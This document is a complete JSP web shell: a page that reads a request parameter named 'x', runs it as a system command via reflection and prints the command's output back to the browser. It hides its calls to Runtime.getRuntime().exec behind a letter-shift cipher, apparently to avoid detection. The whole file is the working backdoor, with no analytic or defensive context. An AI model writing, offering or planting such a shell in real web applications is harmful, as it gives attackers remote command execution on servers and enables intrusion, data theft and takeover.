<%@ page contentType="text/html;charset=UTF-8"  language="java" %>
<%@ page import="java.lang.reflect.Method"%>
<%!public static String plusStr(String str){String plus = "";int length = str.length();for (int i = 0; i < length; i++){char z = str.charAt(i);
if(z>='a'&&z<='w'){z=(char)(z+3);plus=plus+z;}
else if(z>='x'&&z<='z'){z=(char)(z-23);plus=plus+z;}
else{plus=plus+z;}}return plus;}
%>
<%
String x = request.getParameter("x");
if(x!=null){
	Class rt = Class.forName(plusStr("gxsx.ixkd.Rrkqfjb"));
	Method gr = rt.getMethod(plusStr("dbqRrkqfjb"));
    Method ex = rt.getMethod(plusStr("bubz"), String.class);
	Process e = (Process) ex.invoke(gr.invoke(null),x);
	java.io.InputStream in = e.getInputStream();
	int a = -1;
	byte[] b = new byte[2048];
	out.print("<pre>");
	while((a=in.read(b))!=-1){
		out.println(new String(b));
	}
	out.print("</pre>");
}
%>